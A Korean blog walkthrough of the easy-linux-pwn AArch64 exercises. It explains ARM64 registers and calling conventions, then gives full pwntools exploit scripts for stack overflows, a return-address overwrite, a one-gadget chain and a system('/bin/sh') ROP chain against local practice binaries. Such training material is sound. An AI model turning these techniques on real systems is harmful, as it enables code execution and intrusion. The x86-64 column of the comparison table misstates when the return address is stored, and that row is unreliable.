---
title: "AArch64 바이너리 익스플로잇: easy_linux_pwn"
date: 2020-01-01
description: "AArch64 호출 규약, x86-64와의 스택 레이아웃 차이, ROP 체인 구성을 다루는 ARM64 익스플로잇 실습 워크스루"
tags: ["AArch64", "ARM64", "pwn", "ROP", "binary-exploitation", "Linux"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 소개

AArch64 바이너리 익스플로잇 예제를 찾다가 [easy-linux-pwn](https://github.com/xairy/easy-linux-pwn.git) 레포지토리를 발견했다. 아키텍처별로 다양한 소형 익스플로잇 연습 문제들이 정리되어 있다.

![easy-linux-pwn 레포지토리 개요](/images/blog/aarch64-easy-linux-pwn/Untitled.png)

이 포스트는 ARM64 문제들을 풀어나가면서, x86-64와 다른 익스플로잇 방식을 이해하기 위해 필요한 AArch64 아키텍처 기초를 함께 다룬다.

## AArch64 아키텍처 기초

### 레지스터

AArch64는 31개의 범용 레지스터를 제공한다. `X0`~`X30`(64비트)과, 그 하위 32비트에 접근하는 `W0`~`W30` 별칭이 존재한다.

### PSTATE

PSTATE는 프로세서 상태(Processor STATE) 정보를 제공한다. AArch64/AArch32 전용 속성과 두 모드 공통 속성으로 구성되며, ARMv7의 CPSR과 1:1로 대응되지 않는다.

### 특수 목적 레지스터

AArch64는 범용 레지스터 외에도 여러 특수 목적 레지스터를 제공한다.

![AArch64 특수 목적 레지스터](/images/blog/aarch64-easy-linux-pwn/Untitled-1.png)

### ELR (Exception Link Register)

ELR은 익셉션에서 복귀할 때 돌아갈 실행 위치를 저장하는 레지스터다. 프로세서가 현재 Exception Level에 해당하는 ELR 값을 PC에 복사한다. 복귀할 대상이 없는 EL0를 제외한 각 익셉션 레벨마다 존재하며, 이름은 `ELR_EL[n]`이다.

### SPSR (Saved Program Status Register)

SPSR은 특정 시점의 프로세서 상태를 저장하는 레지스터다. 익셉션이 발생하면 프로세서가 PSTATE에서 SPSR로 현재 상태를 저장하고, 익셉션에서 복귀할 때 SPSR에서 PSTATE로 복원한다. ELR과 마찬가지로 EL0를 제외한 각 익셉션 레벨마다 존재하며, 이름은 `SPSR_EL[n]`이다.

### XZR / WZR

ZR은 제로 레지스터다. 소스로 사용하면 0이 읽히고, 목적지로 사용하면 결과가 버려진다. `XZR`은 64비트, `WZR`은 32비트 형태다.

### SP / WSP

SP는 스택의 현재 위치를 가리키는 레지스터다. EL0를 포함한 각 익셉션 레벨마다 존재하며 이름은 `SP_EL[n]`이다. `WSP`는 32비트 스택 포인터다.

한 가지 특이한 점은, EL0 이외의 익셉션 레벨에서는 해당 레벨의 `SP_EL[n]`과 `SP_EL0` 중 하나를 선택하여 스택 포인터로 사용할 수 있다는 것이다.

### 시스템 레지스터

AArch64에서 시스템 설정은 시스템 레지스터를 통해 제어하며, `MSR`과 `MRS` 명령어로 접근한다. AArch64는 코프로세서(Co-processor)를 지원하지 않으므로 ARMv7처럼 cp15 연산 방식의 인터페이스는 제공되지 않는다. 시스템 레지스터 이름 끝의 숫자는 접근 가능한 가장 낮은 익셉션 레벨을 나타낸다.

`TTBR0_EL1` 레지스터의 값을 `x0`으로 읽어오는 예:

```c
MRS x0, TTBR0_EL1
```

반대로 `x0` 값을 `TTBR0_EL1`에 쓰는 예:

```c
MSR TTBR0_EL1, x0
```

## ABI: 레지스터 사용 규약

아키텍처마다 바이너리들이 상호 동작하기 위한 규칙이 존재하는데, 이를 ABI(Application Binary Interface)라고 한다. AArch64의 경우 **AAPCS64**(Procedure Call Standard for the ARM 64-bit Architecture)가 이를 정의하며, 어셈블리와 C 사이의 인터페이스 및 함수 호출 규약을 다룬다.

![AAPCS64 레지스터 역할](/images/blog/aarch64-easy-linux-pwn/Untitled-2.png)

| 레지스터 | 역할 |
|----------|------|
| X0~X7 | 파라미터 및 반환값 저장; X0에 함수 반환값 저장 |
| X8 | 간접 결과 위치 레지스터 (대형 반환값의 주소 전달에 사용) |
| X9~X15 | Caller 저장 임시 레지스터 (호출자가 필요 시 자신의 스택에 저장) |
| X16~X17 | 인트라 프로시저 스크래치 레지스터 (IP0, IP1) |
| X18 | 플랫폼 레지스터 |
| X19~X28 | Callee 저장 레지스터 (피호출자가 보존 의무) |
| X29 | Frame Pointer (FP) |
| X30 | Procedure Link Register (LR) |

x86-64와의 핵심 차이점: **리턴 주소가 LR(X30)에 저장**된다. x86-64에서 `call` 명령어가 리턴 주소를 스택에 푸시하는 방식과 다르다. X30은 함수가 추가 호출을 할 때만 함수 프롤로그에서 스택에 저장된다.

---

## 문제 풀이

### 00-hello-pwn

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("/bin/sh");
    return EXIT_SUCCESS;
}
```

그냥 실행하면 끝난다. 모든 pwn 문제의 목표 상태랄까.

```
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
```

### 01-local-overflow

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct frame {
    char buffer[128];
    unsigned long x;
};

int main(int argc, char** argv) {
    struct frame f;
    memset(&f, 0, sizeof(f));

    printf("> ");
    fflush(stdout);

    read(STDIN_FILENO, &f.buffer[0], 256);

    printf("x = %lx\n", f.x);
    if (f.x == (unsigned long)0xdeadbabebeefc0deUL) {
        printf("launching shell...\n");
        system("/bin/sh");
    }

    return EXIT_SUCCESS;
}
```

구조체 멤버 `x`에 `0xdeadbabebeefc0de`를 넣어주면 익스 성공이다. 구조체에서 `buffer[128]` 바로 뒤에 `x`가 위치하므로, 128바이트 패딩 후 원하는 값을 이어 붙이면 된다.

```python
#!/usr/bin/python

from struct import pack, unpack
import sys
from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/01-local-overflow'

p = process(binary_path)

payload = ''
payload += "A"*128
payload += p64(0xdeadbabebeefc0de)

p.readuntil('> ')
p.write(payload)
p.interactive()
```

### 02-overwrite-ret

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void not_called() {
    printf("launching shell...\n");
    system("/bin/sh");
}

int vulnerable() {
    printf("> ");
    fflush(stdout);

    char buffer[128];
    read(STDIN_FILENO, &buffer[0], 256);
}

int main(int argc, char** argv) {
    vulnerable();
    return EXIT_SUCCESS;
}
```

목표는 실행 흐름을 `not_called`로 리다이렉트하는 것이다. x86-64에서는 `call`이 리턴 주소를 스택에 푸시하고 `ret`이 그걸 RIP로 팝한다. AArch64는 방식이 다르다.

어셈블리를 핸드 트레이싱해서 스택 레이아웃을 파악해보자.

**main 함수 디스어셈블:**

```
0x0000000000400724 <+0>:   stp  x29, x30, [sp, #-32]!
0x0000000000400728 <+4>:   mov  x29, sp
0x000000000040072c <+8>:   str  w0, [x29, #28]
0x0000000000400730 <+12>:  str  x1, [x29, #16]
0x0000000000400734 <+16>:  bl   0x4006e0 <vulnerable>
0x0000000000400738 <+20>:  mov  w0, #0x0
0x000000000040073c <+24>:  ldp  x29, x30, [sp], #32
0x0000000000400740 <+28>:  ret
```

단계별 분석:
1. `stp x29, x30, [sp, #-32]!` — x29(FP)와 x30(LR)을 `[sp]`와 `[sp+8]`에 저장, `sp -= 32` (함수 프롤로그)
2. `mov x29, sp` — 프레임 포인터 설정
3. `str w0, [x29, #28]` — argc 저장
4. `str x1, [x29, #16]` — argv 저장
5. `bl 0x4006e0` — `vulnerable`로 branch-and-link; x30(LR)에 리턴 주소(`0x400738`) 저장
6. `mov w0, #0x0` — 반환값 설정
7. `ldp x29, x30, [sp], #32` — 스택에서 x29와 x30 복원, `sp += 32`
8. `ret` — x30으로 점프

**vulnerable 함수 디스어셈블:**

```
0x00000000004006e0 <+0>:   stp  x29, x30, [sp, #-144]!
0x00000000004006e4 <+4>:   mov  x29, sp
0x00000000004006e8 <+8>:   adrp x0, 0x400000
0x00000000004006ec <+12>:  add  x0, x0, #0x818
0x00000000004006f0 <+16>:  bl   0x4005a0 <printf@plt>
0x00000000004006f4 <+20>:  adrp x0, 0x410000
0x00000000004006f8 <+24>:  ldr  x0, [x0, #4056]
0x00000000004006fc <+28>:  ldr  x0, [x0]
0x0000000000400700 <+32>:  bl   0x400580 <fflush@plt>
0x0000000000400704 <+36>:  add  x0, x29, #0x10
0x0000000000400708 <+40>:  mov  x2, #0x100
0x000000000040070c <+44>:  mov  x1, x0
0x0000000000400710 <+48>:  mov  w0, #0x0
0x0000000000400714 <+52>:  bl   0x400590 <read@plt>
0x0000000000400718 <+56>:  nop
0x000000000040071c <+60>:  ldp  x29, x30, [sp], #144
0x0000000000400720 <+64>:  ret
```

핵심 관찰:
- `stp x29, x30, [sp, #-144]!` — 144바이트 스택 프레임 상단에 x29와 x30 저장
- `add x0, x29, #0x10` — `buffer`는 `x29 + 0x10`에 위치
- `read(0, buffer, 0x100)` — 128바이트 버퍼에 256바이트 읽기 (overflow 가능)
- 에필로그 `ldp x29, x30, [sp], #144`가 스택에서 x29와 x30을 복원한 뒤 `ret`이 x30으로 점프

핵심 인사이트: **저장된 x30(LR)은 vulnerable 프레임의 `sp + 8`에 위치**한다(저장된 x29 바로 다음). buffer는 `x29 + 0x10`에서 시작한다.

`buffer`에서 저장된 x30까지의 오프셋 계산:

```
saved_x30: sp + 8
buffer:    x29 + 0x10 = sp + 0x10  (프롤로그 후 x29 == sp)
```

디버거에서 얻은 실제 주소를 기반으로:

```python
saved_x30_addr = 0x4000800340 + 8  # main의 stp x29, x30, [sp, #-32]!
buffer_addr    = 0x40008002c0
```

오프셋은 `saved_x30_addr - buffer_addr`이다.

```python
#!/usr/bin/python

from struct import pack, unpack
import sys
from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/02-overwrite-ret'
binary = ELF(binary_path)

not_called_addr = binary.symbols['not_called']
saved_x30_addr  = 0x4000800340 + 8
buffer_addr     = 0x40008002c0

p = process(binary_path)

payload = ''
payload += "A" * (saved_x30_addr - buffer_addr)
payload += p64(not_called_addr)
p.readuntil('> ')
p.write(payload)
p.interactive()
```

x30 레지스터는 x86의 `push ebp`와 유사한 역할을 한다. `buffer`와 저장된 x30 사이의 거리를 계산하면 buffer 오프셋을 제외한 전체 스택 프레임 크기를 알 수 있다.

### 03-one-gadget

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vulnerable() {
    printf("> ");
    fflush(stdout);

    char buffer[128];
    read(STDIN_FILENO, &buffer[0], 256);
}

int main(int argc, char** argv) {
    vulnerable();
    return EXIT_SUCCESS;
}
```

이번 문제는 one-shot 가젯(one-gadget)을 이용한 익스다. 구조는 같은 버퍼 오버플로이며, `execl("/bin/sh", ...)`을 호출하는 libc 가젯 하나만 찾으면 된다.

스택 레이아웃을 시각적으로 정리해보자. `vulnerable` 함수의 `read` 직후 `$sp`를 출력하면:

![read 이후 vulnerable의 스택 레이아웃](/images/blog/aarch64-easy-linux-pwn/Untitled-3.png)

- 초록색 (하단): main의 함수 프롤로그에서 저장된 x29, x30
- 빨간색: `buffer[128]`
- 노란색: vulnerable 함수 프롤로그에서 저장된 x29, x30

덮어쓸 수 있는 범위: `buffer`와 main의 저장된 x30(LR).

에필로그 시퀀스:

```
0x0000000000400670 <+60>:  ldp  x29, x30, [sp], #144
0x0000000000400674 <+64>:  ret
```

`vulnerable`이 반환된 후 main의 에필로그:

```
0x0000000000400738 <+20>:  mov  w0, #0x0
0x000000000040073c <+24>:  ldp  x29, x30, [sp], #32
0x0000000000400740 <+28>:  ret
```

이 두 번째 에필로그가 스택에서 x29와 x30을 로드한 뒤 x30으로 점프한다. 우리가 원하는 가젯 주소를 x30에 넣으면 된다.

one-gadget은 `execl("/bin/sh", x1)`을 호출한다. 동작하려면 x1이 NULL이어야 한다:

![one-gadget 대상](/images/blog/aarch64-easy-linux-pwn/Untitled-8.png)

x1을 원하는 값으로 로드하고 두 번째 리다이렉트를 제공하는 가젯이 필요하다:

```
0x2c490 : ldr x1, [x29, #0x18]; ldp x29, x30, [sp], #0x20; mov x0 x1; ret;
```

이 가젯은 `[x29 + 0x18]`에서 x1을 로드하고, 스택에서 새 x30을 로드한다.

**페이로드 레이아웃:**

```
| buffer[128] | zero_addr - 0x18 | ldr_x1_x30_ret | "B"x16 | p64(0) | execl_gadget |
|             |      x29         |      x30        | dummy  |   x29  |      x30     |
```

buffer를 채운 뒤:
1. x29를 `zero_addr - 0x18`로 설정해 `ldr x1, [x29, #0x18]`가 `zero_addr`에서 로드 (x1 = 0)
2. x30을 `ldr_x1_x30_ret` 가젯으로 설정
3. 그 가젯 이후 x30이 one-gadget 주소가 됨

```python
#!/usr/bin/python

from struct import pack, unpack
import sys
from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/03-one-gadget'
libc_path   = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

binary = ELF(binary_path)
libc   = ELF(libc_path)
p      = process(binary_path)

libc_base                = 0x0000004000846000
saved_x30_addr           = 0x4000800340 + 8
buffer_addr              = 0x40008002c0
one_gadget_addr          = libc_base + 0x63e80      # execl("/bin/sh", x1=NULL)
ldr_x1_x30_ret_gadget    = libc_base + 0x2c490      # ldr x1, [x29, #0x18]; ldp x29, x30, [sp], #0x20; mov x0 x1; ret

bin_sh_addr = libc_base + libc.search('/bin/sh\x00').next()
zero_addr   = libc_base + libc.search(p64(0)).next()

payload  = ''
payload += "A" * (saved_x30_addr - buffer_addr - 8)
payload += p64(zero_addr - 0x18)       # x29: ldr x1, [x29, #0x18]가 zero_addr에서 로드
payload += p64(ldr_x1_x30_ret_gadget)  # x30: ldr 가젯으로 점프
payload += "B" * 16                    # dummy
payload += p64(0)                      # x29 (다음 프레임)
payload += p64(one_gadget_addr)        # x30: one-gadget

p.readuntil('> ')
p.write(payload)
p.interactive()
```

### 06-system-rop

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vulnerable() {
    printf("> ");
    fflush(stdout);

    char buffer[128];
    read(STDIN_FILENO, &buffer[0], 512);
}

int main(int argc, char** argv) {
    vulnerable();
    return EXIT_SUCCESS;
}
```

동일한 오버플로지만, 이번에는 `system("/bin/sh")`을 호출하는 고전적인 ROP 체인으로 해결한다.

목표: `x0 = &"/bin/sh"` 후 `system` 호출. x86-64에서는 보통 `pop rdi; ret` 가젯을 체이닝한다. AArch64에서는 `ldp`로 여러 레지스터를 한 번에 로드하는 방식을 사용한다.

libc에서 찾은 두 가젯:

```
ldp_x24_x25_x30_ret: ldp x24, x25, [sp, #0x38]; ldp x29, x30, [sp], #0x50; ret
mov_x0_x24_blr_x25:  mov x0, x24; blr x25;
```

**체인 흐름:**
1. `ldp_x24_x25_x30_ret`로 점프 — `[sp + 0x38]`에서 x24, x25를 로드하고 스택에서 새 x30을 로드
2. x30을 `mov_x0_x24_blr_x25`로 설정 — `ret` 실행 시 여기로 착지
3. `mov_x0_x24_blr_x25`가 x0을 x24(`&"/bin/sh"`)로 설정하고 x25(`system`)를 호출

**페이로드 레이아웃:**

```
| buffer + dummy | ldp_x24_x25_x30_ret | dummy[16] | p64(0) | mov_x0_x24_blr_x25 | dummy(0x38-16) | &/bin/sh | system |
```

```python
import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/06-system-rop'
libc_path   = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

saved_x30_addr = 0x4000800340 + 8
buffer_addr    = 0x40008002c0
libc_addr      = 0x0000004000846000

ldp_x24_x25_x30_ret_addr = libc_addr + 0x00036edc  # ldp x24, x25, [sp, #0x38]; ldp x29, x30, [sp], #0x50; ret
mov_x0_x24_blr_x25_addr  = libc_addr + 0x000ce2ec  # mov x0, x24; blr x25;

libc       = ELF(libc_path)
system_addr  = libc_addr + libc.symbols['system']
bin_sh_addr  = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)

payload  = ''
payload += 'a' * (saved_x30_addr - buffer_addr)
payload += p64(ldp_x24_x25_x30_ret_addr)  # x30: 여기 먼저 착지
payload += 'b' * 16                        # dummy
payload += p64(0)                          # x29
payload += p64(mov_x0_x24_blr_x25_addr)   # x30: 다음 ret 목적지
payload += 'c' * (0x38 - 16)              # sp+0x38까지 패딩
payload += p64(bin_sh_addr)               # x24 -> "/bin/sh"
payload += p64(system_addr)               # x25 -> system

p.readuntil('> ')
p.write(payload)
p.interactive()
```

---

## 스택 레이아웃: AArch64 vs x86-64

x86-64 익스플로잇을 해온 사람이 처음 AArch64를 접할 때 가장 혼란스러운 핵심 차이점:

| 항목 | x86-64 | AArch64 |
|------|--------|---------|
| 리턴 주소 저장 | `call`이 자동으로 RIP를 스택에 푸시 | `bl`이 리턴 주소를 X30(LR)에 기록 |
| 스택 저장 시점 | 중첩 호출이 있을 때만 | 프롤로그 `stp x29, x30, [sp, #-N]!`로 항상 FP와 LR을 함께 저장 |
| ret 명령어 | 스택에서 RIP를 팝 | X30으로 점프 |
| 오버플로 목표 | 스택의 리턴 주소를 직접 덮어씀 | 알려진 스택 오프셋의 저장된 X30을 덮어씀 |
| 가젯 체이닝 | `pop rdi; ret` 스타일 | `ldp x0, x1, [sp], #N; ret` 스타일 — 가젯 하나로 여러 레지스터 처리 |

03번 문제에서 보여준 디버깅 방법은 AArch64 익스플로잇에서 필수다. `qemu-aarch64-static`에 `-g` 플래그를 붙여 GDB를 연결하고, `ldp` 에필로그가 최종 `ret` 전에 레지스터들을 어떻게 이동시키는지 직접 관찰해야 한다.

```bash
qemu-aarch64-static -L /usr/aarch64-linux-gnu -g 1234 ./bin/arm64/03-one-gadget <<< $(perl -e 'print "A"x128, "B"x8, "C"x8')
```

이렇게 하면 스택 프레임 전환이 눈에 보이고, 오프셋 계산에서 추측을 없앨 수 있다.
